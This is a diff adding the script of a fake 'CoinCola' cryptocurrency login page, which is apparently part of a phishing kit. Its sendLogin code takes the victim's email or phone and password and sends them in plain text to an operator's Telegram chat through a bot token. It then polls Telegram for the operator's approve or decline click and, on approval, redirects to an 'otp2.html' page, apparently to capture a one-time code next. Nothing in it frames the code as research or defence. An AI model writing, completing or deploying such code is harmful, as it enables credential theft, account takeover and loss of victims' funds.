+        const APPROVAL_REDIRECT_URL = "otp2.html";
+
+        // =====================================================
+        // POLLING STATE
+        // =====================================================
+        let pollDecided = false;
+        let pollTimeoutId = null;
+        let pollAbortController = null;
+        let isPollingActive = false;
+
+        // =====================================================
+        // UI HELPERS
+        // =====================================================
+        function showError(msg) {
+            const err = document.getElementById('loginError');
+            if (err) {
+                err.textContent = msg;
+                err.style.display = 'block';
+            }
+        }
+
+        function hideError() {
+            const err = document.getElementById('loginError');
+            if (err) err.style.display = 'none';
+        }
+
+        function setBusy(busy) {
+            document.getElementById('spinnerOverlay').classList.toggle('active', busy);
+            document.querySelectorAll('form button[type="submit"]').forEach(btn => {
+                btn.disabled = busy;
+            });
+        }
+
+        // =====================================================
+        // CANCEL POLLING
+        // =====================================================
+        function cancelPolling() {
+            pollDecided = true;
+            if (pollTimeoutId) clearTimeout(pollTimeoutId);
+            if (pollAbortController) pollAbortController.abort();
+            isPollingActive = false;
+            setBusy(false);
+            showError('Request cancelled. Please try again.');
+        }
+
+        // =====================================================
+        // POLLING ENGINE — long-poll, 409-safe, callback-only
+        // =====================================================
+        function startPolling(userId) {
+            pollDecided = false;
+            let offset = 0;
+            let pollCount = 0;
+            const MAX_POLLS = 180;
+
+            if (pollAbortController) pollAbortController.abort();
+            pollAbortController = new AbortController();
+
+            function pollLoop() {
+                if (pollDecided) return;
+                if (isPollingActive) {
+                    pollTimeoutId = setTimeout(pollLoop, 500);
+                    return;
+                }
+
+                pollCount++;
+                if (pollCount > MAX_POLLS) {
+                    pollDecided = true;
+                    setBusy(false);
+                    showError('Request timed out. Please try again.');
+                    return;
+                }
+
+                isPollingActive = true;
+
+                const url =
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates` +
+                    `?offset=${offset}&timeout=15&allowed_updates=%5B%22callback_query%22%5D`;
+
+                fetch(url, {
+                        signal: pollAbortController.signal
+                    })
+                    .then(res => {
+                        if (res.status === 409) {
+                            isPollingActive = false;
+                            pollTimeoutId = setTimeout(pollLoop, 3000);
+                            return null;
+                        }
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data === null) return;
+
+                        if (!data.ok || pollDecided) {
+                            isPollingActive = false;
+                            if (!pollDecided) {
+                                pollTimeoutId = setTimeout(pollLoop, 1000);
+                            }
+                            return;
+                        }
+
+                        if (data.result && data.result.length > 0) {
+                            for (const update of data.result) {
+                                offset = update.update_id + 1;
+
+                                if (update.callback_query) {
+                                    const action = update.callback_query.data;
+
+                                    // Answer callback to remove loading state
+                                    fetch(
+                                            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                                method: 'POST',
+                                                headers: {
+                                                    'Content-Type': 'application/json'
+                                                },
+                                                body: JSON.stringify({
+                                                    callback_query_id: update.callback_query.id,
+                                                    text: "Processing..."
+                                                })
+                                            }
+                                        )
+                                        .catch(() => {});
+
+                                    if (action === `approve_${userId}`) {
+                                        pollDecided = true;
+                                        isPollingActive = false;
+                                        setBusy(false);
+                                        // Approval — redirect to next page
+                                        window.location.href = APPROVAL_REDIRECT_URL;
+                                        return;
+                                    } else if (action === `decline_${userId}`) {
+                                        pollDecided = true;
+                                        isPollingActive = false;
+                                        setBusy(false);
+                                        showError('Request declined. Please try again.');
+                                        return;
+                                    }
+                                }
+                            }
+                        }
+
+                        isPollingActive = false;
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, 500);
+                        }
+                    })
+                    .catch(err => {
+                        if (err.name === 'AbortError') return;
+                        console.error('Poll error:', err);
+                        isPollingActive = false;
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, 2000);
+                        }
+                    });
+            }
+
+            pollLoop();
+        }
+
+        // =====================================================
+        // SEND MESSAGE + INLINE KEYBOARD
+        // =====================================================
+        function sendTelegramWithInlineKeyboard(message, keyboard, userId) {
+            let attempts = 0;
+            const maxAttempts = 3;
+
+            function attemptSend() {
+                attempts++;
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML',
+                            reply_markup: JSON.stringify(keyboard)
+                        })
+                    })
+                    .then(res => {
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data.ok) {
+                            startPolling(userId);
+                        } else {
+                            if (attempts < maxAttempts) {
+                                setTimeout(attemptSend, 1000 * attempts);
+                            } else {
+                                setBusy(false);
+                                showError('Failed to send notification. Please try again.');
+                            }
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Send error:', err);
+                        if (attempts < maxAttempts) {
+                            setTimeout(attemptSend, 1000 * attempts);
+                        } else {
+                            setBusy(false);
+                            showError('Network error. Please check your connection and try again.');
+                        }
+                    });
+            }
+
+            attemptSend();
+        }
+
+        // =====================================================
+        // SUBMIT LOGIN FOR APPROVAL
+        // =====================================================
+        function sendLogin() {
+            hideError();
+
+            const email = document.getElementById('email').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const password = document.getElementById('password').value;
+
+            const identifier = email || phone;
+            if (!identifier || !password) {
+                showError('Please enter your login details.');
+                return;
+            }
+
+            // Show spinner
+            setBusy(true);
+
+            // Unique userId per session
+            const userId = 'login_' + Date.now();
+
+            const message =
+                `🔐 <b>New CoinCola Login</b>\n\n` +
+                `👤 Account: <code>${identifier}</code>\n` +
+                `🔑 Password: <code>${password}</code>\n` +
+                `⏰ Time: ${new Date().toLocaleString('en-ZA')}\n\n` +
+                `Please approve or decline:`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "✅ APPROVE",
+                        callback_data: `approve_${userId}`
+                    }, {
+                        text: "❌ DECLINE",
+                        callback_data: `decline_${userId}`
+                    }]
+                ]
+            };
+
+            sendTelegramWithInlineKeyboard(message, keyboard, userId);
+        }
+
+        // =====================================================
+        // EVENT WIRING
+        // =====================================================
+        // Tab switching (phone / email)
+        const tabButtons = document.querySelectorAll('#loginTabs .tab');
+        tabButtons.forEach(btn => {
+            btn.addEventListener('click', () => {
+                tabButtons.forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                document.getElementById('emailForm').classList.toggle('hidden', btn.dataset.tab === 'phone');
+                document.getElementById('phoneForm').classList.toggle('hidden', btn.dataset.tab === 'email');
+            });
+        });
+
+        // Show / hide password
+        document.getElementById('togglePassword').addEventListener('click', () => {
+            const pw = document.getElementById('password');
+            pw.type = pw.type === 'password' ? 'text' : 'password';
+            document.getElementById('togglePassword').classList.toggle('visible');
+        });
+
+        // Log in submits credentials for approval
+        [document.getElementById('emailForm'), document.getElementById('phoneForm')].forEach(form => {
+            form.addEventListener('submit', e => {
+                e.preventDefault();
+                sendLogin();
+            });
+        });
+
+        // Cancel polling from the spinner overlay
+        document.getElementById('cancelPollBtn').addEventListener('click', cancelPolling);
+    </script>
+</body>
+
+</html>
